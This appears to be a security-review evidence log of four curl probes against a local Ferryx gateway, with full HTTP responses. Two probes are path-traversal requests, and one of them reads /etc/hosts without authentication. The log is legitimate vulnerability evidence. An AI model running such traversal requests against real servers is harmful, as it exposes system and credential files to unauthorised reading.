# Web Remote HTTP Evidence

Captured by the review orchestrator on 2026-09-06 at 22:29-22:30 UTC.
Target: existing local gateway at 127.0.0.1:43821. No credentials or device state were changed.
The running binary commit was not established; these are live-server observations, not final-tree build certification.

## Probe 1

Command: `curl --silent --show-error --max-time 8 -i http://127.0.0.1:43821/api/v1/health`

Exit code: 0

```http
HTTP/1.1 200 OK
content-type: application/json
vary: origin, access-control-request-method, access-control-request-headers
access-control-allow-origin: *
content-length: 33
date: Sun, 06 Sep 2026 22:29:57 GMT

{"status":"ok","version":"0.1.0"}
```

Stderr: (empty)

## Probe 2

Command: `curl --silent --show-error --max-time 8 --path-as-is -i http://127.0.0.1:43821/../../package.json`

Exit code: 0

```http
HTTP/1.1 200 OK
content-type: text/html; charset=utf-8
content-length: 1287
vary: origin, access-control-request-method, access-control-request-headers
access-control-allow-origin: *
date: Sun, 06 Sep 2026 22:29:57 GMT

<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/png" href="/assets/ferryx-icon-OXRkkUvz.png" />
    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <link rel="manifest" href="/manifest.webmanifest" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
    <title>Ferryx</title>
    <style>
      html,
      body {
        background: #23262d;
        color: #fafafa;
      }
    </style>
    <script type="module" crossorigin src="/assets/index-D8i-6W0P.js"></script>
    <link rel="stylesheet" crossorigin href="/assets/index-BMQcwKfv.css">
  </head>
  <body class="bg-background text-foreground antialiased">
    <div id="root"></div>
    <!-- Vite injects /@vite/client in dev; keeping a single app entry avoids duplicate HMR clients. -->
  </body>
</html>
```

Stderr: (empty)

## Probe 3

Command: `curl --silent --show-error --max-time 8 -i http://127.0.0.1:43821/api/v1/sessions`

Exit code: 0

```http
HTTP/1.1 401 Unauthorized
content-type: text/plain; charset=utf-8
vary: origin, access-control-request-method, access-control-request-headers
access-control-allow-origin: *
content-length: 18
date: Sun, 06 Sep 2026 22:29:57 GMT

Missing auth token
```

Stderr: (empty)

## Probe 4

Command: `curl --silent --show-error --max-time 8 --path-as-is -i http://127.0.0.1:43821/../../../../../../../../../../../../../../../../etc/hosts`

Exit code: 0

```http
HTTP/1.1 200 OK
content-type: application/octet-stream
content-length: 213
vary: origin, access-control-request-method, access-control-request-headers
access-control-allow-origin: *
date: Sun, 06 Sep 2026 22:30:10 GMT

##
# Host Database
#
# localhost is used to configure the loopback interface
# when the system is booting.  Do not change this entry.
##
127.0.0.1	localhost
255.255.255.255	broadcasthost
::1             localhost

```

Stderr: (empty)
